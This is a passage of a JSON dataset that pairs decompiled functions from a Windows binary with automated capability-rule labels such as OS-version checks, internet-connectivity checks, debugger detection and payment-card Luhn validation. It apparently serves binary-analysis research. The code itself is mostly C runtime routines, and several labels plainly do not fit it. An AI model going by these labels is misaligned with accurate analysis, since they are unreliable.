{\n                    (&var_10h)[iVar11] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar11 = iVar11 + -1;\n            } while (-1 < iVar11);\n            iVar11 = (*0x435e18 >> 0x1f & 0x1fU) + *0x435e18 >> 5;\n            uVar8 = 0x1f - (*0x435e18 & 0x1f);\n            if (((&var_10h)[iVar11] & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar16 = (&var_10h)[iVar11] & ~(-1 << (uVar8 & 0x1f));\n                iVar14 = iVar11;\n                while (uVar16 == 0) {\n                    iVar14 = iVar14 + 1;\n                    if (2 < iVar14) goto code_r0x0041af43;\n                    uVar16 = (&var_10h)[iVar14];\n                }\n                iVar14 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n                uVar16 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n                bVar5 = false;\n                uVar17 = uVar16 + (&var_10h)[iVar14];\n                if ((uVar17 < (&var_10h)[iVar14]) || (uVar17 < uVar16)) {\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar14] = uVar17;\n                while ((iVar14 = iVar14 + -1,  -1 < iVar14 && (bVar5))) {\n                    bVar5 = false;\n                    uVar16 = (&var_10h)[iVar14] + 1;\n                    if ((uVar16 < (&var_10h)[iVar14]) || (uVar16 == 0)) {\n                        bVar5 = true;\n                    }\n                    (&var_10h)[iVar14] = uVar16;\n                }\n            }\ncode_r0x0041af43:\n            (&var_10h)[iVar11] = (&var_10h)[iVar11] & -1 << (uVar8 & 0x1f);\n            iVar11 = iVar11 + 1;\n            if (iVar11 < 3) {\n                puVar13 = &var_10h + iVar11;\n                for (iVar14 = 3 - iVar11; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            iVar14 = *0x435e1c + 1;\n            iVar11 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar14 & 0x1f;\n            var_20h = 0;\n            var_34h = 0;\n            do {\n                uVar16 = (&var_10h)[var_34h];\n                (&var_10h)[var_34h] = uVar16 >> uVar8 | var_20h;\n                var_20h = (uVar16 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_34h = var_34h + 1;\n            } while (var_34h < 3);\n            puVar13 = &var_8h + -iVar11;\n            iVar14 = 2;\n            do {\n                if (iVar14 < iVar11) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\ncode_r0x0041ac88:\n        iVar15 = 0;\n    }\ncode_r0x0041b139:\n    uVar16 = iVar15 << (0x1f - uVar3 & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x435e20 == 0x40) {\n        arg_ch[1] = uVar16;\n        *arg_ch = var_ch;\n    }\n    else if (*0x435e20 == 0x20) {\n        *arg_ch = uVar16;\n    }\n    fcn.004023ff(uVar1 & 0x8000);\n    return;\n}\n",
        "token_count": 3205
    },
    "0041b92f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041bc39)\n// WARNING: Removing unreachable block (ram,0x0041bc42)\n// WARNING: Removing unreachable block (ram,0x0041c076)\n// WARNING: Removing unreachable block (ram,0x0041bc9f)\n// WARNING: Removing unreachable block (ram,0x0041bcbd)\n// WARNING: Removing unreachable block (ram,0x0041bca4)\n// WARNING: Removing unreachable block (ram,0x0041bcab)\n// WARNING: Removing unreachable block (ram,0x0041bcb0)\n// WARNING: Removing unreachable block (ram,0x0041bcc0)\n// WARNING: Removing unreachable block (ram,0x0041c06c)\n// WARNING: Removing unreachable block (ram,0x0041bcc8)\n// WARNING: Removing unreachable block (ram,0x0041bccd)\n// WARNING: Removing unreachable block (ram,0x0041bcd4)\n// WARNING: Removing unreachable block (ram,0x0041bcd7)\n// WARNING: Removing unreachable block (ram,0x0041bcef)\n// WARNING: Removing unreachable block (ram,0x0041bcf1)\n// WARNING: Removing unreachable block (ram,0x0041bcfb)\n// WARNING: Removing unreachable block (ram,0x0041bcfe)\n// WARNING: Removing unreachable block (ram,0x0041bd05)\n// WARNING: Removing unreachable block (ram,0x0041bd08)\n// WARNING: Removing unreachable block (ram,0x0041c05e)\n// WARNING: Removing unreachable block (ram,0x0041c07c)\n// WARNING: Removing unreachable block (ram,0x0041bd14)\n// WARNING: Removing unreachable block (ram,0x0041c04f)\n// WARNING: Removing unreachable block (ram,0x0041bd20)\n// WARNING: Removing unreachable block (ram,0x0041bd30)\n// WARNING: Removing unreachable block (ram,0x0041bd32)\n// WARNING: Removing unreachable block (ram,0x0041bd3c)\n// WARNING: Removing unreachable block (ram,0x0041bd45)\n// WARNING: Removing unreachable block (ram,0x0041c035)\n// WARNING: Removing unreachable block (ram,0x0041bd50)\n// WARNING: Removing unreachable block (ram,0x0041bd67)\n// WARNING: Removing unreachable block (ram,0x0041bd79)\n// WARNING: Removing unreachable block (ram,0x0041bd8a)\n// WARNING: Removing unreachable block (ram,0x0041bdc9)\n// WARNING: Removing unreachable block (ram,0x0041bdd2)\n// WARNING: Removing unreachable block (ram,0x0041c012)\n// WARNING: Removing unreachable block (ram,0x0041bde0)\n// WARNING: Removing unreachable block (ram,0x0041bdf2)\n// WARNING: Removing unreachable block (ram,0x0041bdf7)\n// WARNING: Removing unreachable block (ram,0x0041be04)\n// WARNING: Removing unreachable block (ram,0x0041be0a)\n// WARNING: Removing unreachable block (ram,0x0041be10)\n// WARNING: Removing unreachable block (ram,0x0041be1b)\n// WARNING: Removing unreachable block (ram,0x0041be20)\n// WARNING: Removing unreachable block (ram,0x0041be2d)\n// WARNING: Removing unreachable block (ram,0x0041be32)\n// WARNING: Removing unreachable block (ram,0x0041bdea)\n// WARNING: Removing unreachable block (ram,0x0041c029)\n// WARNING: Removing unreachable block (ram,0x0041c02f)\n// WARNING: Removing unreachable block (ram,0x0041be36)\n// WARNING: Removing unreachable block (ram,0x0041be44)\n// WARNING: Removing unreachable block (ram,0x0041be4b)\n// WARNING: Removing unreachable block (ram,0x0041be57)\n// WARNING: Removing unreachable block (ram,0x0041be77)\n// WARNING: Removing unreachable block (ram,0x0041be7c)\n// WARNING: Removing unreachable block (ram,0x0041be81)\n// WARNING: Removing unreachable block (ram,0x0041be84)\n// WARNING: Removing unreachable block (ram,0x0041be8b)\n// WARNING: Removing unreachable block (ram,0x0041be8e)\n// WARNING: Removing unreachable block (ram,0x0041be9a)\n// WARNING: Removing unreachable block (ram,0x0041bea3)\n// WARNING: Removing unreachable block (ram,0x0041beb2)\n// WARNING: Removing unreachable block (ram,0x0041bec9)\n// WARNING: Removing unreachable block (ram,0x0041becd)\n// WARNING: Removing unreachable block (ram,0x0041beff)\n// WARNING: Removing unreachable block (ram,0x0041bf04)\n// WARNING: Removing unreachable block (ram,0x0041bf10)\n// WARNING: Removing unreachable block (ram,0x0041bf1f)\n// WARNING: Removing unreachable block (ram,0x0041bf25)\n// WARNING: Removing unreachable block (ram,0x0041bf26)\n// WARNING: Removing unreachable block (ram,0x0041bf51)\n// WARNING: Removing unreachable block (ram,0x0041bf5b)\n// WARNING: Removing unreachable block (ram,0x0041bf6d)\n// WARNING: Removing unreachable block (ram,0x0041bf71)\n// WARNING: Removing unreachable block (ram,0x0041bf7b)\n// WARNING: Removing unreachable block (ram,0x0041bf89)\n// WARNING: Removing unreachable block (ram,0x0041bfc5)\n// WARNING: Removing unreachable block (ram,0x0041bf91)\n// WARNING: Removing unreachable block (ram,0x0041bfbc)\n// WARNING: Removing unreachable block (ram,0x0041bf9c)\n// WARNING: Removing unreachable block (ram,0x0041bfb4)\n// WARNING: Removing unreachable block (ram,0x0041bfad)\n// WARNING: Removing unreachable block (ram,0x0041bfc0)\n// WARNING: Removing unreachable block (ram,0x0041bfc9)\n// WARNING: Removing unreachable block (ram,0x0041bfcc)\n// WARNING: Removing unreachable block (ram,0x0041bff8)\n// WARNING: Removing unreachable block (ram,0x0041bfd9)\n// WARNING: Removing unreachable block (ram,0x0041c032)\n// WARNING: Removing unreachable block (ram,0x0041c03d)\n// WARNING: Removing unreachable block (ram,0x0041c081)\n// WARNING: Variable defined which should be unmapped: var_80h\n\nvoid __cdecl\nfcn.0041b92f(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00403fac();\n        *puVar2 = 0x16;\n        fcn.00406bf3();\n        fcn.004023ff(arg_8h);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0041b9be. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x41c0a7\n    (**0x41c0a7)();\n    return;\n}\n",
        "token_count": 1931
    },
    "004206ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004206ea(uint16_t *arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint unaff_EBX;\n    uint16_t *arg_ch_00;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_28h;\n    double dStack40;\n    uint var_1ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    fcn.0040d9b1(arg_10h);\n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == NULL) {\n        puVar2 = fcn.00403fac();\n        *puVar2 = 0x16;\n        fcn.00406bf3();\n    }\n    else {\n        uVar1 = *arg_8h;\n        arg_ch_00 = arg_8h;\n        while (iVar3 = fcn.0041cc17(uVar1, 8),  iVar3 != 0) {\n            arg_ch_00 = arg_ch_00 + 1;\n            uVar1 = *arg_ch_00;\n        }\n        puVar4 = fcn.00420a04(&var_1ch, arg_ch_00, &var_34h);\n        if (arg_ch != NULL) {\n            *arg_ch = arg_ch_00 + puVar4[1];\n        }\n        if ((*puVar4 & 0x240) == 0) {\n            if ((*puVar4 & 0x81) == 0) {\n                if (((*puVar4 & 0x100) != 0) && (*(puVar4 + 4) == 0.0)) {\n                    puVar2 = fcn.00403fac();\n                    *puVar2 = 0x22;\n                }\n            }\n            else {\n                dStack40 = *0x435df0;\n                if (*arg_ch_00 == 0x2d) {\n                    dStack40 = -*0x435df0;\n                }\n                puVar2 = fcn.00403fac();\n                *puVar2 = 0x22;\n            }\n        }\n        else if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n    }\n    if (var_28h != '\\0') {\n        *(var_2ch + 0x70) = *(var_2ch + 0x70) & 0xfffffffd;\n    }\n    fcn.004023ff(unaff_EBX);\n    return;\n}\n",
        "token_count": 621
    },
    "0041e8e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e8e8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x4377a8 == 0) {\n        arg_8h_00 = 0x435ab0;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.0041e565(arg_8h_00, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 122
    },
    "0041e948": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e948(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x4377a8 == 0) {\n        arg_8h_00 = 0x435ab0;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.0041e565(arg_8h_00, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 120
    },
    "00420b08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00420ec6)\n// WARNING: Removing unreachable block (ram,0x00420e46)\n// WARNING: Removing unreachable block (ram,0x004212f7)\n// WARNING: Removing unreachable block (ram,0x00420e58)\n// WARNING: Removing unreachable block (ram,0x00420f3d)\n// WARNING: Removing unreachable block (ram,0x00420e64)\n// WARNING: Removing unreachable block (ram,0x00420e6b)\n// WARNING: Removing unreachable block (ram,0x00420e70)\n// WARNING: Removing unreachable block (ram,0x00420f40)\n// WARNING: Removing unreachable block (ram,0x004212ed)\n// WARNING: Removing unreachable block (ram,0x00420f48)\n// WARNING: Removing unreachable block (ram,0x00420f4e)\n// WARNING: Removing unreachable block (ram,0x00420f56)\n// WARNING: Removing unreachable block (ram,0x00420f59)\n// WARNING: Removing unreachable block (ram,0x00420f71)\n// WARNING: Removing unreachable block (ram,0x00420f73)\n// WARNING: Removing unreachable block (ram,0x00420f7d)\n// WARNING: Removing unreachable block (ram,0x00420f80)\n// WARNING: Removing unreachable block (ram,0x00420f87)\n// WARNING: Removing unreachable block (ram,0x00420f8a)\n// WARNING: Removing unreachable block (ram,0x004212df)\n// WARNING: Removing unreachable block (ram,0x004212fd)\n// WARNING: Removing unreachable block (ram,0x00420f96)\n// WARNING: Removing unreachable block (ram,0x004212d2)\n// WARNING: Removing unreachable block (ram,0x00420fa2)\n// WARNING: Removing unreachable block (ram,0x00420fb2)\n// WARNING: Removing unreachable block (ram,0x00420fb4)\n// WARNING: Removing unreachable block (ram,0x00420fbe)\n// WARNING: Removing unreachable block (ram,0x00420fc8)\n// WARNING: Removing unreachable block (ram,0x004212b8)\n// WARNING: Removing unreachable block (ram,0x00420fd3)\n// WARNING: Removing unreachable block (ram,0x00420fea)\n// WARNING: Removing unreachable block (ram,0x00420ffc)\n// WARNING: Removing unreachable block (ram,0x0042100d)\n// WARNING: Removing unreachable block (ram,0x0042104c)\n// WARNING: Removing unreachable block (ram,0x00421055)\n// WARNING: Removing unreachable block (ram,0x00421295)\n// WARNING: Removing unreachable block (ram,0x00421063)\n// WARNING: Removing unreachable block (ram,0x00421075)\n// WARNING: Removing unreachable block (ram,0x0042107a)\n// WARNING: Removing unreachable block (ram,0x00421087)\n// WARNING: Removing unreachable block (ram,0x0042108d)\n// WARNING: Removing unreachable block (ram,0x00421093)\n// WARNING: Removing unreachable block (ram,0x0042109e)\n// WARNING: Removing unreachable block (ram,0x004210a3)\n// WARNING: Removing unreachable block (ram,0x004210b0)\n// WARNING: Removing unreachable block (ram,0x004210b5)\n// WARNING: Removing unreachable block (ram,0x0042106d)\n// WARNING: Removing unreachable block (ram,0x004212ac)\n// WARNING: Removing unreachable block (ram,0x004212b2)\n// WARNING: Removing unreachable block (ram,0x004210b9)\n// WARNING: Removing unreachable block (ram,0x004210c7)\n// WARNING: Removing unreachable block (ram,0x004210ce)\n// WARNING: Removing unreachable block (ram,0x004210da)\n// WARNING: Removing unreachable block (ram,0x004210fa)\n// WARNING: Removing unreachable block (ram,0x004210ff)\n// WARNING: Removing unreachable block (ram,0x00421104)\n// WARNING: Removing unreachable block (ram,0x00421107)\n// WARNING: Removing unreachable block (ram,0x0042110e)\n// WARNING: Removing unreachable block (ram,0x00421111)\n// WARNING: Removing unreachable block (ram,0x0042111d)\n// WARNING: Removing unreachable block (ram,0x00421126)\n// WARNING: Removing unreachable block (ram,0x00421135)\n// WARNING: Removing unreachable block (ram,0x0042114c)\n// WARNING: Removing unreachable block (ram,0x00421150)\n// WARNING: Removing unreachable block (ram,0x00421182)\n// WARNING: Removing unreachable block (ram,0x00421187)\n// WARNING: Removing unreachable block (ram,0x00421193)\n// WARNING: Removing unreachable block (ram,0x004211a2)\n// WARNING: Removing unreachable block (ram,0x004211a8)\n// WARNING: Removing unreachable block (ram,0x004211a9)\n// WARNING: Removing unreachable block (ram,0x004211d4)\n// WARNING: Removing unreachable block (ram,0x004211de)\n// WARNING: Removing unreachable block (ram,0x004211f0)\n// WARNING: Removing unreachable block (ram,0x004211f4)\n// WARNING: Removing unreachable block (ram,0x004211fe)\n// WARNING: Removing unreachable block (ram,0x0042120c)\n// WARNING: Removing unreachable block (ram,0x00421248)\n// WARNING: Removing unreachable block (ram,0x00421214)\n// WARNING: Removing unreachable block (ram,0x0042123f)\n// WARNING: Removing unreachable block (ram,0x0042121f)\n// WARNING: Removing unreachable block (ram,0x00421237)\n// WARNING: Removing unreachable block (ram,0x00421230)\n// WARNING: Removing unreachable block (ram,0x00421243)\n// WARNING: Removing unreachable block (ram,0x0042124c)\n// WARNING: Removing unreachable block (ram,0x0042124f)\n// WARNING: Removing unreachable block (ram,0x0042127b)\n// WARNING: Removing unreachable block (ram,0x0042125c)\n// WARNING: Removing unreachable block (ram,0x004212b5)\n// WARNING: Removing unreachable block (ram,0x004212c0)\n// WARNING: Removing unreachable block (ram,0x00421302)\n// WARNING: Variable defined which should be unmapped: var_80h\n\nvoid __cdecl\nfcn.00420b08(uint arg_8h, uint arg_ch, int16_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00403fac();\n        *puVar2 = 0x16;\n        fcn.00406bf3();\n        fcn.004023ff(arg_8h);\n        return;\n    }\n    for (; (((iVar1 = *arg_10h,  iVar1 == 0x20 || (iVar1 == 9)) || (iVar1 == 10)) || (iVar1 == 0xd));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x00420bc0. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x421328\n    (**0x421328)();\n    return;\n}\n",
        "token_count": 1868
    },
    "00401210": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401210(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.CClock.0;\n    (*_sym.imp.GDI32.dll_DeleteObject)(in_ECX[1]);\n    (*_sym.imp.GDI32.dll_DeleteDC)(in_ECX[4]);\n    (*_sym.imp.USER32.dll_DestroyWindow)(in_ECX[6]);\n    if ((arg_8h & 1) != 0) {\n        fcn.004023fa();\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0040e3c3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e3c3(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    code *pcVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    code *var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_EncodePointer;\n    var_4h = *0x435040 ^ &stack0xfffffffc;\n    var_1ch = arg_8h;\n    iVar7 = 0;\n    arg_8h_00 = 0;\n    var_20h = arg_ch;\n    pcVar1 = (*_sym.imp.KERNEL32.dll_EncodePointer)();\n    var_18h = pcVar1;\n    var_14h = fcn.0040641a();\n    if (*0x43777c == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"USER32.DLL\", 0, 0x800);\n        if (((iVar2 == 0) &&\n            ((iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar2 != 0x57 ||\n             (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryExW)(L\"USER32.DLL\", 0, 0),  iVar2 == 0)))) ||\n           (iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxW\"),  iVar3 == 0)) goto code_r0x0040e598;\n        *0x43777c = (*pcVar6)(iVar3);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetActiveWindow\");\n        *0x437780 = (*pcVar6)(uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetLastActivePopup\");\n        *0x437784 = (*pcVar6)(uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetUserObjectInformationW\");\n        *0x43778c = (*pcVar6)(uVar4);\n        pcVar1 = var_18h;\n        if (*0x43778c != NULL) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"GetProcessWindowStation\");\n            *0x437788 = (*pcVar6)(uVar4);\n            pcVar1 = var_18h;\n        }\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 == 0) {\n        if (var_14h != NULL) {\n            (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x43777c);\n            goto code_r0x0040e598;\n        }\n    }\n    else {\n        if (var_1ch != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(var_1ch);\n        }\n        if (var_14h != NULL) goto code_r0x0040e598;\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x437788 == pcVar1) || (*0x43778c == pcVar1)) {\ncode_r0x0040e54e:\n        if ((((*0x437780 != pcVar1) && (pcVar5 = (*pcVar6)(*0x437780),  pcVar5 != NULL)) &&\n            (iVar7 = (*pcVar5)(),  iVar7 != 0)) &&\n           ((*0x437784 != pcVar1 && (pcVar1 = (*pcVar6)(*0x437784),  pcVar1 != NULL)))) {\n            iVar7 = (*pcVar1)(iVar7);\n        }\n    }\n    else {\n        var_14h = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x437788);\n        var_18h = (*pcVar6)(*0x43778c);\n        if (((var_14h == NULL) || (var_18h == NULL)) ||\n           (((iVar2 = (*var_14h)(),  iVar2 != 0 && (iVar2 = (*var_18h)(iVar2, 1, &var_10h, 0xc, &var_24h),  iVar2 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040e54e;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x43777c);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(iVar7, var_1ch, var_20h, arg_10h);\n    }\ncode_r0x0040e598:\n    fcn.004023ff(arg_8h_00);\n    return;\n}\n",
        "token_count": 1185
    },
    "00412a74": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412a74(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t arg_8h_00;\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406830(0x4346e8, 0x10);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar1 = fcn.00403f78();\n        *puVar1 = 0;\n        puVar1 = fcn.00403fac();\n        *puVar1 = 9;\n    }\n    else {\n        if ((arg_8h_00 < 0) || (*0x438be8 <= arg_8h_00)) {\n            puVar1 = fcn.00403f78();\n            *puVar1 = 0;\n        }\n        else {\n            iVar3 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*((arg_8h_00 >> 5) * 4 + 0x437368) + 4 + iVar3) & 1) != 0) {\n                fcn.00414bcb(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((arg_8h_00 >> 5) * 4 + 0x437368) + 4 + iVar3) & 1) == 0) {\n                    puVar1 = fcn.00403fac();\n                    *puVar1 = 9;\n                    puVar1 = fcn.00403f78();\n                    *puVar1 = 0;\n                    uVar2 = 0xffffffff;\n                }\n                else {\n                    uVar2 = fcn.00412b63(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                }\n                *(unaff_EBP + -0x1c) = uVar2;\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00412b3b();\n                goto code_r0x00412b5d;\n            }\n            puVar1 = fcn.00403f78();\n            *puVar1 = 0;\n        }\n        puVar1 = fcn.00403fac();\n        *puVar1 = 9;\n        fcn.00406bf3();\n    }\ncode_r0x00412b5d:\n    fcn.00406875();\n    return;\n}\n",
        "token_count": 643
    },
    "0040107d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040107d(uint hInstance)\n\n{\n    uint ARG_0;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    ARG_0 = 0x30;\n    var_2ch = 3;\n    var_28h = 0x401046;\n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = hInstance;\n    var_18h = (*_sym.imp.USER32.dll_LoadIconA)(hInstance, 0x6b);\n    var_14h = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f00);\n    var_10h = 6;\n    var_ch = 0;\n    var_8h = 0x4368b0;\n    var_4h = (*_sym.imp.USER32.dll_LoadIconA)(var_1ch, 0x6c);\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&ARG_0);\n    return;\n}\n",
        "token_count": 288
    },
    "004041ee": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041ee(int32_t arg_8h)\n\n{\n    if (*0x4351c0 != -1) {\n        if (arg_8h == 0) {\n            arg_8h = fcn.004062e2(*0x4351c0);\n        }\n        fcn.00406301(*0x4351c0, 0);\n        fcn.004040b9(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00414fe0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00414fe0(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if (unaff_EDI == 0) {\n        puVar1 = *((unaff_ESI >> 5) * 4 + 0x437368) + 4 + (unaff_ESI & 0x1f) * 0x40;\n        *puVar1 = *puVar1 & 0xfe;\n    }\n    fcn.00415087(unaff_ESI);\n    return;\n}\n",
        "token_count": 131
    },
    "0041348d": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
